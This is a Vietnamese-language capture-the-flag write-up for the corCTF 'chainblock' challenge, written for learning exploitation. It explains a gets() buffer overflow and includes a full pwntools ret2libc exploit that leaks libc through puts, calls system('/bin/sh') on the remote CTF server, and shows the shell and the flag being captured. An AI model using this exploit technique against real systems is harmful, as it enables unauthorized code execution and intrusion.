# Chainblock

## Khảo sát file ELF
### file chainblock
File 64-bit, dynamically linked, và không stripped.
```sh
zir@ubuntu:~/corCTF$ file chainblock
chainblock: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f45d5c8b2bc867b5a9b4b82928a047c87e13bd79, not stripped
```

### checksec

```sh
pwndbg> checksec
[*] '/home/zir/corCTF/chainblock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found      <----- Buffer Overlow dễ dàng
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)    <----- Địa chỉ gadget sẽ không đổi, .bss không đổi.
    RUNPATH:  './'

```

### Hàm verify()
Chương trình sử dụng hàm gets(s1) cho phép buffer overlow thoải mái không cần quan tâm độ dài. vì thế đè ret và thực hiện ROP dễ dàng. 
```sh
int verify()
{
  char s1[256]; // [rsp+0h] [rbp-100h] BYREF

  printf("Please enter your name: ");
  gets(s1);          <--------------- Buffer overflow -------------
  if ( strcmp(s1, name) )
    return puts("KYC failed, wrong identity!");
  printf("Hi %s!\n", name);
  return printf("Your balance is %d chainblocks!\n", (unsigned int)balance);
}
```

# Solution

* Leak libc , tính libc_base
* Ret2Libc để lên shell.

### Leak libc, tính libc_base

Sử dụng hàm puts để in ra màn hình console địa chỉ bất kỳ, mình sẽ chọn địa chỉ puts
Sau đó quay lại hàm main 1 lần nữa
```python
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)
```
Chương trình sau khi chạy qua payload này sẽ in ra màn hình địa chỉ của puts, bắt địa chỉ hàm puts và tính libc_base

```sh
puts_leak = u64(s.recv(6).ljust(8,'\x00'))
base = puts_leak - puts_off
```

Tính địa chỉ hàm system, địa chỉ chứa chuỗi "/bin/sh" thông qua libc_base vừa tính
```sh
system = sys_off + base
binsh = bin_off + base
```
### Ret2libc

Sau khi chương trình quay lại hàm main, sử dụng kỹ thuật ret2libc để lên shell
```sh
payload2 = padding
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(ret)
payload2 += p64(system)
```

File Exploit
```sh
from pwn import *
s = remote('pwn.be.ax', 5000)
#s = process('./chainblock')
libc = ELF('./libc.so.6')
elf = ELF('./chainblock')
#context.log_level="debug"
#pause()

puts_got = 0x404018
puts_plt = 0x401030
pop_rdi  = 0x0000000000401493
puts_off = libc.symbols['puts']
bin_off = next(libc.search('/bin/sh'))
sys_off = libc.symbols['system']
main = elf.symbols['main']
ret = 0x000000000040101a


payload = 'Techlead\x00'
payload = payload.ljust(0x108,'a')
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

s.recvuntil('Please enter your name: ')
s.sendline(payload)
s.recvline()
s.recvline()

puts_leak = u64(s.recv(6).ljust(8,'\x00'))
base = puts_leak - puts_off
system = sys_off + base
binsh = bin_off + base

print "puts_addr >> " + hex(puts_leak)
print "base >> " + hex(base)
print "system >> " + hex(system)
print "binsh >> " + hex(binsh)

payload2 = 'Techlead\x00'
payload2 = payload2.ljust(0x108,'A')
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(ret)
payload2 += p64(system)

s.recvuntil('Please enter your name: ')
s.sendline(payload2)
s.interactive()
```

## Run file và cat flag

```sh
zir@ubuntu:~/corCTF$ python solve_chainblock.py 
[+] Opening connection to pwn.be.ax on port 5000: Done
[*] '/home/zir/corCTF/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/zir/corCTF/chainblock'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fe000)
    RUNPATH:  './'
puts_addr >> 0x7f248392c9d0
base >> 0x7f24838ac000
system >> 0x7f24838fba60
binsh >> 0x7f2483a57f05
[*] Switching to interactive mode
Hi Techlead!
Your balance is 100000000 chainblocks!
$ 
$ ls
flag.txt
ld-linux-x86-64.so.2
libc.so.6
run
$ cat flag.txt
corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}$  
```

## Flag >>> `corctf{mi11i0nt0k3n_1s_n0t_a_scam_r1ght}`